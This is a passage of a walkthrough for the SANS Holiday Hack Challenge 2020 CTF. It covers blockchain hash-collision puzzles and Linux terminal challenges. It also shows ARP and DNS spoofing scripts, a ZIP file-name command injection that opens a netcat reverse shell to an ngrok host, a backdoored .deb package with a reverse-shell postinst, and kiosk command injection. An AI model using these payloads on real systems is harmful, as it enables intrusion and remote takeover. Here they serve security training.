#.png\u0026rdquo;\n$ zip archive.zip \u0026ldquo;';nc 0.tcp.ngrok.io 19686 -c bash #.png\u0026rdquo;\n$ nc -lnvp 1234 # start netcat listener on port 1234 We upload the ZIP…and we get a reverse shell as the user app!!\nreverse shell   There is one last vulnerability that we can exploit. The upload feature is vulnerable to Zip Slip. We can craft an evil ZIP file that can add/overwrite any file on the system where the user app can write.\nWe can now move on to the next objective…Talking again to Noel shows he is happy but has some work to do:\nNoel Boetie:\nYay! You found the flaw!\nWe\u0026rsquo;ll work on fixing it. We unlock a new narrative:\nnarrative 5 of 7   9 - ARP Shenanigans Objective 9 description   Again, the terminal is only accessible to Santa.\nObjective 9 location   Alabaster Snowball:\nHey Santa! You\u0026rsquo;ve got to check out our Scapy Present Packet Prepper! Please work through the whole thing to make sure it\u0026rsquo;s helpful for our guests! I made it so that players can help() to see how to get tasks and hints. When you\u0026rsquo;re done, maybe you can help me with this other issue I\u0026rsquo;m having.\nOh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine.\nIt seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we\u0026rsquo;ll still need to cook up something to change the HTTP response. I\u0026rsquo;m sure glad you\u0026rsquo;re here Santa.\n We have access to 3 TMUX terminals to help in this task. One of them shows the following message:\nwelcome message   After having completed the Scapy Present Packet Prepper challenge we got some interesting hints to help us achieve this objective. Let\u0026rsquo;s take them one by one:\nH1. Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. Our IP address is 10.6.0.2 and we know from the hints that 10.6.6.35 may have been hit by a malware. When sniffing eth0 we mainly get ARP requests from the 10.6.6.35 that asks who has the 10.6.6.53:\ntcpdump capture   H2. The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts. To achieve ARP spoofing, we can use the given script /home/guest/scripts/arp_resp.py. Almost everything is ready, we only need to replace the SOME*HERE and 99999 values to match the protocol and then execute it:\n We can have a look at this example to help. Let\u0026rsquo;s start with line 14. The Ethernet source is our own one that we can get with ifconfig or we can simply re-use the macaddr variable:\nsource MAC address   For the Ethernet destination, we need to capture the attacker packet with more details. This can be achieved by displaying the ARP table:\n$ arp -a arp_requester.guestnet0.kringlecastle.com (10.6.6.35) at 4c:24:57:ab:ed:84 [ether] on eth0 Line 14 becomes:\n14  ether_resp = Ether(dst=\u0026#34;4c:24:57:ab:ed:84\u0026#34;, type=0x806, src=macaddr)   For the ARP reply options (lines 16 to 21):\n16 17 18 19 20 21  arp_response = ARP(pdst=\u0026#34;4c:24:57:ab:ed:84\u0026#34;) arp_response.op = 2 # reply operation  arp_response.plen = 4 # protocol size arp_response.hwlen = 6 # hardware addresse size arp_response.ptype = 0x800 # protocol type IPv4 arp_response.hwtype = 1 # hardware protocol Ethernet   For the source and destinations addresses (lines 23 to 26):\n23 24 25 26  arp_response.hwsrc = macaddr # our Mac address arp_response.psrc = \u0026#34;10.6.6.53\u0026#34; # the spoofed IP address arp_response.hwdst = \u0026#34;4c:24:57:ab:ed:84\u0026#34; # attacker Mac address arp_response.pdst = \u0026#34;10.6.6.35\u0026#34; # attacker IP address   We launch our modified script while capturing packets:\nARP spoofing   We see our spoofed ARP reply and the attacker sending a DNS query to our host to resolve the domain ftp.osuosl.org.\nH3. Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let\u0026rsquo;s return a DNS response resolving the request to our IP. We are again helped for the DNS spoofing with the dns_resp.py script that we will need to complete:\n The goal is to send a DNS response to the attacker resolving the domain name to our IP address to see what the malware will do next. We can get some help on the DNS protocol from this capture.\nFirst, we need to change the IP address we are spoofing on line 11:\n11  ipaddr_we_arp_spoofed = \u0026#34;10.6.6.53\u0026#34;   On lines 16 to 17, we need to set the right Ethernet/IP addresses. We have seen most of the values in the ARP spoofing part:\n16 17  eth = Ether(src=macaddr, dst=\u0026#34;4c:24:57:ab:ed:84\u0026#34;) ip = IP(dst=\u0026#34;10.6.6.35\u0026#34;, src=ipaddr_we_arp_spoofed)   Regarding the UDP layer on line 18, we need to capture the attacker source port that will be the destination port in the response. As the attacker packet is an argument of the function we can retrieve it with packet[UDP].sport. The source port is the DNS default port:\n18  udp = UDP(dport=packet[UDP].sport, sport=53)   Finally, the DNS response will be on lines 19 to 21. We take most of the information from the DNS request:\n19 20 21 22 23 24 25 26  dns = DNS( id = packet[DNS].id, \\ # the DNS query ID qd = packet[DNS].qd, \\ # the query domain aa = 1, \\ # authoritative answer qr = 1, \\ # 0 for a request and 1 for a response # the domain name that resolves on our IP an = DNSRR(rrname=packet[DNS].qd.qname, rdata=ipaddr) )   We can launch, in order, tcpdump -nni eth0, ./dns_resp.py \u0026amp;, that will wait until a DNS query is seen, and ./arp_resp.py. What we see is that after a successful ARP and DNS spoofing, an HTTP call (in green) is done on our host by the attacker:\nDNS spoofing   Let\u0026rsquo;s start an HTTP listener to see the attacker\u0026rsquo;s request. This can be quickly done with Python: python3 -m http.server 80:\nHTTP listener   H4. The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file We have some .deb files available in /home/guest/debs. We can follow the given article to add a Netcat reverse shell to the .deb file.\nFirst, we prepare our working environment, copy the Netcat package that we will use for the reverse shell and rename it as the package that the attacker is fetching:\n$ mkdir /tmp/packing\n$ cd /tmp/packing\n$ cp /home/guest/debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb ./suriv_amd64.deb We extract the package in the work directory:\n$ dpkg -x suriv_amd64.deb work We retrieve the control file from the package:\n$ mkdir work/DEBIAN\n$ ar -x suriv_amd64.deb\n$ tar xf control.tar.xz ./control We create the postinst script that will trigger the Netcat reverse shell to our host on port 1234:\n$ echo -e \u0026lsquo;#!/bin/bash\\nnc -e /bin/sh 10.6.0.2 1234\u0026rsquo; \u0026gt; postinst Then copy those files in the work/DEBIAN folder and build the new backdoored package that we rename with the right name:\n$ mv control work/DEBIAN/\n$ mv postinst work/DEBIAN/\n$ chmod +x work/DEBIAN/postinst\n$ dpkg-deb \u0026ndash;build /tmp/packing/work/\n$ mv work.deb suriv_amd64.deb Now that the package is ready to be delivered to the attacker, we create the necessary folder tree in /tmp and copy our package there. Then we spawn our HTTP listener from the /tmp folder:\n$ mkdir -p /tmp/pub/jfrost/backdoor\n$ mv suriv_amd64.deb /tmp/pub/jfrost/backdoor\n$ cd /tmp\n$ python3 -m http.server 80 From another terminal pane, we spawn a Netcat listener with nc -lnvp 1234 and yet from the third terminal pane, we launch our two spoofing scripts as we did before. After a few second, we have a hit:\nreverse shell   We are on the attacker host with his jfrost account! We find the needed file NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt in the root folder. You can read it here.\nTanta Kringle  We unlock the 6th narrative:\nnarrative 6 of 7   10 - Defeat Fingerprint Sensor Objective 10 description   First of all, we need to activate the Santa\u0026rsquo;s Office floor. This is now possible as we found the last bulb and items on the Roof. Here is one possible solution to hit the three sockets with the right color:\nSantavator completed   We have now access to Santa\u0026rsquo;s Office…well\u0026hellip;almost, as it is protected with a fingerprint:\nSantavator fingerprint   Our avatar cannot access it…but we can as Santa. However, the goal is to access Santa\u0026rsquo;s Office without impersonating Santa. How to bypass that?\nWe can have a look at the Javascript code of the Santavator in app.js. By using the browser\u0026rsquo;s Developer Tools (see this article). We see that in order to access this floor we need 1) to power the button (what we just did) and 2) get the besanta token that we usually get when we impersonate Santa:\napp.js snippet   In the console, we can check the tokens we currently have and we are indeed missing the besanta one:\nconsole   We simply add it to the list by using the JS console and the second check is passed :)\nfingerprint bypass   We can now reach Santa\u0026rsquo;s Office:\nSanta\u0026#39;s office   Tinsel is not happy though:\nTinsel Upatree:\nGOSHGOLLY How did you get in here??\nI mean, hey, I\u0026rsquo;m impressed you made it in here, but you\u0026rsquo;ve got to leave! Breaking into Santa\u0026rsquo;s Office might mean immediate membership on the wrong side of the Naughty/Nice List.\n 11a - Naughty/Nice List with Blockchain Investigation Part 1 Objective 11a description   This challenge can only be done as Santa.\nObjective 11a location   Tinsel Upatree is waiting for us with a document on our desk:\nTinsel Upatree:\nSanta, I don\u0026rsquo;t know if you\u0026rsquo;ve heard, but something is very, very wrong…\nWe tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score… positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago…\nWorse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn\u0026rsquo;t possible.\nWe ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack\u0026rsquo;s big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk.\nYou can get some tools to help you here. Tangle Coalbox, in the Speaker UNPreparedness Room. has been talking with attendees about the issue.\n The tools that we get will help in interacting with the blockchain.dat (the actual _Naughty/Nice _blockchain) we retrieve from Santa\u0026rsquo;s desk. We can as well have a look at this KringleCon 3 talk.\nThe naughty_nice.py Python script explains how the blockchain is constructed and how we can interact with it to read or verify blocks.\nWe can get some basic information on the blockchain as well as the details of the first block with the following code:\ngetting blockchain basic knowledge   The output is:\nblockchain stats and block example   We see that we have a partial blockchain that starts at index 128449 and ends at index 129996. A total of 1548 blocks. If we verify the blockchain as-is, it will fail as the genesis block (the first block) does not exist:\nblockchain failed verification   We have to set the initial previous_hash to the one of the first block we have at our disposal and that we saw earlier:\nblockchain passed verification   We can as well dump the embedded documents with the Block.dump_doc(doc_no) method. For the first block it would be:\n1  bc.blocks[0].dump_doc(1)   We get the embedded PDF that looks like this:\n128449.pdf   Elf-on-the-shelf is the reporter and the number that follows is its RID in decimal value. We get to know that Banjamin has the PID 0803508ada0a5ebf.\nNow that we have a fairly good understanding of the Naughty/Nice Blockchain structure, let\u0026rsquo;s answer the objective question.\nThe nonces are 64-bit values and are generated with the Python random function. What we saw in the Snowball Game, is that random uses the Marsene-Twister (MT19937) algorithm for the PRNG. The standard implementation generates 32-bit random numbers. So how is the Python implementation used to generate 64-bit random numbers?\nWe can have a look at the random module from the CPython Github repository. Its underlying implementation is done in C and can be found here. From the function _random_Random_getrandbits_impl we understand how random numbers bigger than 32-bit are generated:\nhttps://github.com/python/cpython/blob/master/Modules/_randommodule.c   So for 64-bit numbers, it will generate two 32-bit numbers and concatenate them! This works for any bit size, if the size is not a multiple of 32, it just drops the least significant bits of the last random number to match the right size. Let\u0026rsquo;s try it in an interpreter:\n32-bit (left) vs 64-bit (right) random numbers   This a good news as we can still use the marsene-twister-predictor to predict the next nonces. We just need to extract the nonces from the blockchain, split each of them into two 32-bit numbers and feed them to the predictor. The following code extracts the nonces into nonces.txt:\nextract nonces into a file   Now we need to feed the last 624 numbers of the list to mt19937predict so that we can retrieve the future ones. As we have to find the nonce of the block 130000 (which is 4 blocks after the last one), we need to get the next 8 32-bit random numbers and concatenate the last 2 in their hexadecimal form:\n$ cat nonces.txt | tail -n 624 | mt19937predict | head -n 8\n1710059470 # used for block 129997\n3074734778\n15809261 # used for block 129998\n25586365\n3180594148 # used for block 129999\n2219797255 4079973021 # used for block 130000\n1460036376 We can get the final answer with Python:\n1 2  \u0026gt;\u0026gt;\u0026gt; hex(1460036376)[2:]+hex(4079973021)[2:] \u0026#39;57066318f32f729d\u0026#39;   57066318f32f729d  We can investigate the blockchain a little more and check if there is some block content that differs from others:\nare there blocks that contain more than one document? check what blocks have more than 1 document   We have only one result, the block with ID 129459.\nare there blocks that contain a document type other than PDF? check what blocks have doc type different than PDF   Again, we have only one result, the block with ID 129459.\nso what\u0026rsquo;s in this block 129459? weird block   This block is definitely shady. This elf has the highest possible score, there is some binary data that seems meaningless and the PDF size is the biggest of all the blocks. If we dump the PDF data, we get Jack Frost\u0026rsquo;s report:\nJack Frost report   This is probably the block that Tinsel Upatree was mentioning. The block that has been tampered with by Jack Frost to be the nicest person in the world!!\nOpening the PDF with Adobe Reader may not work as the file may be flagged as corrupted. It can be read, however, with browsers like Chrome or Firefox.  11b - Naughty/Nice List with Blockchain Investigation Part 2 Objective 11b description   Let\u0026rsquo;s first confirm that Jack\u0026rsquo;s altered block is the shady block we found out in the previous Objective. The following code will uncover it based on the SHA256 that we are given:\nfind the altered block   The only output we get is, again, the block 129459!\nSo we know that Jack Frost has been able to alter the block and keep the same MD5 hash (collision) by changing only 4 bytes! The very first one seems obvious and is the sign that indicates if the elf is naughty or nice. We can change it from 1 to 0. This makes Jack the naughtiest elf on Earth!\nWe know from the hints gathered in the Snowball Game that the technique that was used by Jack to generate the collision was UniColl. The technique is described in this Hash Collision Exploitation slide deck (from slide 101 onward) and we can find some additional information here.\nWithout going into the cryptographic details, the UniColl collision technique characteristics are the following:\n we can choose the prefix and it can be of any size blocks are 64 bytes the prefix is part of the collision blocks given 2 binary blobs with the same MD5 hash, only 2 bytes are different. The first byte difference is +1 and the second byte difference is -1. the first byte is the 10th byte of the last block containing the prefix the second byte is the 10th byte of the next block  An example of the slide deck shows it more clearly:\nhttps://speakerdeck.com/ange/colltris?slide=113   Knowing that and by looking at the block data, we start to understand what changes have been done:\nhttps://speakerdeck.com/ange/colltris?slide=113   As we can see, the weird binary blob is part of the collision blocks and the second byte we have to change is probably in there. Let\u0026rsquo;s have a look at the collision blocks binary data. We can call the Block.block_data() method and print the first 192 bytes (the size of 3 collision blocks). After some data arrangement, we get:\ncollision blocks   The 10th byte of the last prefix block corresponds to our naughty/nice flag. So if we change it to 0, we will need to increment the 10th byte of the next block which is 0xd6. Let\u0026rsquo;s compute the hash after those 2 changes and check that the MD5 has not changed:\nverify MD5 hashes before and after changes   We got the first 2 bytes!\nJack Frost has as well tampered with the PDF file to show a fake report instead of the original one made by Shinny Upatree. He must have as well used some trick to get an MD5 collision. Let\u0026rsquo;s first have a look at the PDF file in a hex editor. We can use HexEd.it:\nhttps://hexed.it/   We see a first Catalog object (with a hidden message for Santa) that references the object 2 that is a Pages dictionary which indicates what are the pages of the document. The Pagesdictionary (in blue) only has 1 page (Count 1) and the page information is in the Kidobject 23.\nWe see as well another page tree that is not referenced (in green). It has as well only one page referred in Kid object 15. If we change the Catalog reference to object 3 and save this new document, we access what seems the original report on Jack Frost which says the exact opposite of the previous one:\nJack Frost original report   This is the 3rd byte to change then! This looks again like Jack used a UniColl collision. The method to create such PDF is described here and at the end of the slide deck. The structure of such a PDF looks like this:\nhttps://github.com/corkami/collisions#pdf   As per UniColl rules, if we increase the 10th byte of the prefix, we must decrease the 10th byte of the next block (64 bytes after). The Pages reference of our PDF, however, is not aligned to the 10th byte. This means that the prefix takes some additional bytes before the PDF data into account, so do not expect to have matching MD5 hashes when doing those changes with the PDF alone:\ncollision blocks (partial)   Let\u0026rsquo;s do those changes and verify that the block\u0026rsquo;s MD5 does not change. Knowing that the second byte is at index 127 of the PDF, we can do the following:\nverify MD5 hashes before and after PDF changes   Seems like we have recovered the original block! We compute the SHA-256 hash as follows:\ncompute block SHA-256 hash   fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb  Jack initially added the new block with the correct data about him. However, the block was ready to be altered anytime. The initial PDF was already merged with the evil one and the collision blocks were already part of the documents. He then just needed to wait the right moment to change those 4 bytes without being spotted!\nTinsel does not seem more enthusiast than normal after this big achievement:\nTinsel Upatree:\nThe mystery is solved! I can\u0026rsquo;t wait to see which attendee solved it! Epilogue Time to go to Santa\u0026rsquo;s Balcony where Eve Snowshoes is waiting for Santa:\nEve Snowshoes:\nI\u0026rsquo;m so glad we got the Naughty-Nice Blockchain set right again! Gosh, it would be great to see the SANS Holiday Hack player who helped you fix it!\nCan you go find the person who did that and come back here?\n Let\u0026rsquo;s get back our avatar and come back to Eve. We have to trick again the Santavator as we did in Objective 10. Once in Santa\u0026rsquo;s Office, Tinsel says:\nTinsel Upatree:\nYou - you did it! You solved the mystery! Quickly, go out to the balcony to be recognized! This time the door to the balcony is wide open. As soon as we enter it we unlock the last narrative:\nnarrative 7 of 7   Santa\u0026#39;s balcony - THE END   Santa:\nThank you for foiling Jack\u0026rsquo;s foul plot!\nHe sent that magical portrait so he could become me and destroy the holidays!\nDue to your incredible work, you have set everything right and saved the holiday season! Congratulations on a job well done!\nHo Ho Ho!\n And poor Jack to say:\nJack Frost:\nMy plan was NEARLY perfect… but I never expected someone with your skills to come around and ruin my plan for ruining the holidays!\nAnd now, they\u0026rsquo;re gonna put me in jail for my deeds.\n Finally, Eve gives us access to some hidden swag!\nEve Snowshoes:\nWhat a fantabulous job! Congratulations!\nYou MUST let us know how you did it! Feel free to show off your skills with some swag - only for our victors! HHC2020 Winner swag   CranPi Terminals 1 - Kringle Kiosk [ELF] Shiny Upatree [LOCATION] Castle Approach CranPi Terminal 1 location   Shinny Upatree:\nHiya hiya - I\u0026rsquo;m Shinny Upatree! Check out this cool KringleCon kiosk!\nYou can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it\u0026rsquo;s \u0026ldquo;ingestible.\u0026rdquo; Or something…\nDo you think you could check and see if there is an issue?\n He suggests us a document on Command Injection:\n Command Injection - There\u0026rsquo;s probably some kind of command injection vulnerability in the menu terminal.  \nAfter a welcome message we access the kiosk app:\nkiosk menu   The first menu shows a map of Santa\u0026rsquo;s castle:\ncastle\u0026#39;s map   The second menu displays the KringleCon III and Holiday Hack Challenge Code of Conduct and Terms of Use. The third menu shows the location of each elf:\nelves\u0026#39; location   The last menu is the only one that requires user input and seems the best place to try an injection:\nprint badge name   If our input is concatenated to a system command without being sanitized first, there are chances that we can inject additional commands. We can, for instance, try to add ;ls to our name:\ncommand injection   It worked and it works as well with other special characters like \u0026amp;\u0026amp; or |. We can read the welcome.sh script with ;cat welcome.sh. We discover the logic of the script and where the vulnerability lies:\nwelcome.sh snippet 1   To fix the Command Injection vulnerability, we can enclose the $name variable in double-quotes:\nbash -c \u0026lsquo;/usr/games/cowsay -f /opt/reindeer.cow \u0026ldquo;$name\u0026rdquo;\u0026rsquo; We discover as well a hidden menu plant:\nwelcome.sh snippet 2   where spot our old friend Jason the Plant :)\nJason the Plant   We see that most of the outputs come from files that are stored in /opt. Let\u0026rsquo;s see if there are other hidden gems with ;ls -la /opt:\ndirectory listing /opt   There are 2 additional files: mailbox.txt and success.txt. Both show ASCII art. Nothing else seems interesting, we can finally escape the kiosk app by calling bash ;/bin/bash:\nkiosk escape   Back to Shinny who gives us no less than 5 hints to complete Objective 2:\nShinny Upatree:\nGolly - wow! You sure found the flaw for us!\nSay, we\u0026rsquo;ve been having an issue with an Amazon S3 bucket. Do you think you could help find Santa\u0026rsquo;s package file?\nJeepers, it seems there\u0026rsquo;s always a leaky bucket in the news. You\u0026rsquo;d think we could find our own files!\nDigininja has a great guide, if you\u0026rsquo;re new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying.\nGood luck, and thanks for pitching in!\n  Find Santa\u0026rsquo;s Package - Find Santa\u0026rsquo;s package file from the cloud storage provider. Check Josh Wright\u0026rsquo;s talk for more tips! Bucket_finder.rb - He even wrote a tool to search for unprotected buckets! Santa\u0026rsquo;s Wrapper3000 - Santa\u0026rsquo;s Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages. Finding S3 Buckets - Robin Wood wrote up a guide about finding these open S3 buckets. Leaky AWS S3 Buckets - It seems like there\u0026rsquo;s a new story every week about data exposed through unprotected Amazon S3 buckets.   2 - Linux Primer [ELF] Sugarplum Mary [LOCATION] Courtyard CranPi Terminal 2 location   Sugarplum Mary:\nSugarplum Mary? That\u0026rsquo;s me!\nI was just playing with this here terminal and learning some Linux! It\u0026rsquo;s a great intro to the Bash terminal. If you get stuck at any point, type hintme to get a nudge!\nCan you make it to the end?\n We get the following message when we launch the terminal:\nThe North Pole 🍭 Lollipop Maker: All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and 🍭's will appear in the green bar below. Run the command \u0026ldquo;hintme\u0026rdquo; to receive a hint. This challenge will be a list of Linux commands to run in the terminal. Here are the questions and answers:\nQ1. Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop! $ ls /home/elf # or ls ~\nHELP munchkin_19315479765589239 workshop Q2. Now find the munchkin inside the munchkin. $ cat munchkin_19315479765589239\nmunchkin_24187022596776786 Q3. Great, now remove the munchkin in your home directory. $ rm munchkin_19315479765589239 Q4. Print the present working directory using a command. $ pwd\n/home/elf Q5. Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin! $ ls -la /home/elf # or ls -la ~\ntotal 56\ndrwxr-xr-x 1 elf elf 4096 Dec 12 08:43 .\ndrwxr-xr-x 1 root root 4096 Dec 10 18:14 ..\n-rw-r\u0026ndash;r\u0026ndash; 1 elf elf 31 Dec 10 18:18 .bash_history\n-rw-r\u0026ndash;r\u0026ndash; 1 elf elf 220 Apr 4 2018 .bash_logout\n-rw-r\u0026ndash;r\u0026ndash; 1 elf elf 3105 Dec 5 00:00 .bashrc\n-rw-r\u0026ndash;r\u0026ndash; 1 elf elf 0 Dec 12 08:43 .munchkin_5074624024543078\n-rw-r\u0026ndash;r\u0026ndash; 1 elf elf 807 Apr 4 2018 .profile\n-rw-r\u0026ndash;r\u0026ndash; 1 elf elf 168 Dec 5 00:00 HELP\ndrwxr-xr-x 1 elf elf 20480 Dec 10 18:19 workshop Q6. Excellent, now find the munchkin in your command history. $ history\n1 echo munchkin_9394554126440791 2 ls -la 3 cat HELP 4 ls 5 cat munchkin_19315479765589239 6 rm munchkin_19315479765589239 7 pwd 8 ls -la 9 history Q7. Find the munchkin in your environment variables. $ env\n[\u0026hellip;]\nz_MUNCHKIN=munchkin_20249649541603754\n[\u0026hellip;] Q8. Next, head into the workshop. $ cd workshop Q9. A munchkin is hiding in one of the workshop toolboxes. Use grep while ignoring case to find which toolbox the munchkin is in. $ grep -i munchkin *.txt # the folder contains 500 text files\ntoolbox_191.txt:mUnChKin.4056180441832623 Q10. A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin. $ chmod +x lollipop_engine\n$ ./lollipop_engine\nmunchkin.898906189498077 Q11. Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0. $ cd electrical\n$ mv blown_fuse0 fuse0 Q12. Now, make a symbolic link (symlink) named fuse1 that points to fuse0 $ ln -s fuse0 fuse1 Q13. Make a copy of fuse1 named fuse2. $ cp fuse1 fuse2 Q14. We need to make sure munchkins don\u0026rsquo;t come back. Add the characters \u0026ldquo;MUNCHKIN_REPELLENT\u0026rdquo; into the file fuse2. $ echo \u0026ldquo;MUNCHKIN_REPELLENT\u0026rdquo; \u0026gt; fuse2 Q15. Find the munchkin somewhere in /opt/munchkin_den. $ find /opt/munchkin_den/ -name munchkin* # searching for filename\n$ grep -iR munchkin /opt/munchkin_den/ # searching for file content\n$ find /opt/munchkin_den -iname *munchkin* # both failed, searching for case insensitive filename\n/opt/munchkin_den\n/opt/munchkin_den/apps/showcase/src/main/resources/mUnChKin.6253159819943018 Q16. Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin. $ find /opt/munchkin_den/ -type f -user munchkin\n/opt/munchkin_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411 Q17. Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/munchkin_den. $ find /opt/munchkin_den/ -type f -size +108k -size -110k\n/opt/munchkin_den/plugins/portlet-mocks/src/test/java/org/apache/m_u_n_c_h_k_i_n_2579728047101724 Q18. List running processes to find another munchkin. $ ps -aux\nUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\ninit 1 0.0 0.0 65320 21336 pts/0 Ss+ 08:34 0:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysession.yaml\nelf 63312 0.6 0.0 84316 25840 pts/2 S+ 09:14 0:00 /usr/bin/python3 /14516_munchkin\nelf 64339 0.0 0.0 36180 3336 pts/3 R+ 09:15 0:00 ps -aux Q19. The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen. $ netstat -l\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:54321 0.0.0.0:* LISTEN Q20. The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last munchkin. $ curl localhost:54321\nmunchkin.73180338045875 Q21. Your final task is to stop the 14516_munchkin process to collect the remaining lollipops. $ kill 63312 # PID of the process is 63312, seen in Q18 Once all the tasks are completed, Sugarplum gives us a few hints to complete Objective 3:\nSugarplum Mary:\nYou did it - great!\nMaybe you can help me configure my postfix mail server on Gentoo! Just kidding!\nHey, wouldja' mind helping me get into my point-of-sale terminal? It\u0026rsquo;s down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up?\nShinny says this might be an Electron application. I hear there\u0026rsquo;s a way to extract an ASAR file from the binary, but I haven\u0026rsquo;t looked into it yet.\n  Electron Applications - It\u0026rsquo;s possible to extract the source code from an Electron app. Electron ASAR Extraction - There are tools and guides explaining how to extract ASAR from Electron apps.   3 - Unescape Tmux [ELF] Pepper Minstix [LOCATION] Castle Approach CranPi Terminal 3 location   Pepper Minstix:\nHowdy - Pepper Minstix here!\nI\u0026rsquo;ve been playing with tmux lately, and golly it\u0026rsquo;s useful. Problem is: I somehow became detached from my session. Do you think you could get me back to where I was, admiring a beautiful bird?\nIf you find it handy, there\u0026rsquo;s a tmux cheat sheet you can use as a reference.\nI hope you can help!\n  Tmux Cheat Sheet - There\u0026rsquo;s a handy tmux reference available at https://tmuxcheatsheet.com/!   The terminal welcomes us with the following message:\nCan you help me?\nI was playing with my birdie (she\u0026rsquo;s a Green Cheek!) in something called tmux,\nthen I did something and it disappeared!\nCan you help me find her? We were so attached!! We can start by listing the existing sessions with either tmux ls or tmux list-sessions. We get only one existing session:\n0: 1 windows (created Sat Dec 12 19:25:09 2020) [80x24] We can attach to it with tmux attach to get our birdie back:\ntmux session 0   Now that we solved Pepper\u0026rsquo;s issue, he gives us a few hints to complete Objective 4:\nPepper Minstix:\nYou found her! Thanks so much for getting her back!\nHey, maybe I can help YOU out! There\u0026rsquo;s a Santavator that moves visitors from floor to floor, but it\u0026rsquo;s a bit wonky. You\u0026rsquo;ll need a key and other odd objects. Try talking to Sparkle Redberry about the key.\nFor the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light!\n  Santavator Operations - It\u0026rsquo;s really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel.   4 - Speaker UNprep [ELF] Bushy Evergreen [LOCATION] Talks Lobby CranPi Terminal 4 location   Bushy Evergreen:\nOhai! Bushy Evergreen, just trying to get this door open.\nIt\u0026rsquo;s running some Rust code written by Alabaster Snowball. I\u0026rsquo;m pretty sure the password I need for ./door is right in the executable itself. Isn\u0026rsquo;t there a way to view the human-readable strings in a binary file?\n We unlock the following hints:\n Strings in Binary Files - The strings command is common in Linux and available in Windows as part of SysInternals. Letting a Program Decrypt for You - While you have to use the lights program in /home/elf/ to turn the lights on, you can delete parts in /home/elf/lab/. Lookup Table - For polyalphabetic ciphers, if you have control over inputs and visibility of outputs, lookup tables can save the day.   Bushy wants us to help him open the door of the Speaker Unpreparedness Room which is password protected. The terminal welcomes us with this message:\nHelp us get into the Speaker Unpreparedness Room!\nThe door is controlled by ./door, but it needs a password! If you can figure out the password, it\u0026rsquo;ll open the door right up!\nOh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it\u0026rsquo;d help us a lot!\n(You can do one now and come back to do the others later if you want)\nWe copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react.\nNote: These don\u0026rsquo;t require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!) Let\u0026rsquo;s start by running the door binary:\n$ ./door\nYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There\u0026rsquo;s gotta be a tool for this\u0026hellip;\nWhat do you enter? \u0026gt;\n Let\u0026rsquo;s look at the binary strings with strings door | more. We get pages and pages of strings but we find the password not far from the intro text:\nstrings door | more   The first goal is completed as we enter this password in the door binary. Next, the lights binary:\n$ ./lights\nThe speaker unpreparedness room sure is dark, you\u0026rsquo;re thinking (assuming you\u0026rsquo;ve opened the door; otherwise, you wonder how dark it actually is)\nYou wonder how to turn the lights on? If only you had some kind of hin\u0026mdash;\n\u0026gt;\u0026gt;\u0026gt; CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf\n\u0026mdash;t to help figure out the password\u0026hellip; I guess you\u0026rsquo;ll just have to make do!\nThe terminal just blinks: Welcome back, elf-technician\nWhat do you enter? \u0026gt; 1234\nBeep boop invalid password\n If we look at the lights.conf file, we see what seems an encrypted password and a username:\n$ cat lights.conf\npassword: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124\nname: elf-technician Let\u0026rsquo;s do some tests in the lab folder where we can play with the config files:\n if we rename the config file, we get the error ERROR: Could not load /home/elf/lab/lights.conf, if we delete the password configuration, we get: Password is missing from the config file!, if we replace the password with a blank one, we get That would have turned on the lights!. Good! However, we cannot edit the production config file :(  If we talk again to Bushy, he gives us some other hint:\nBushy 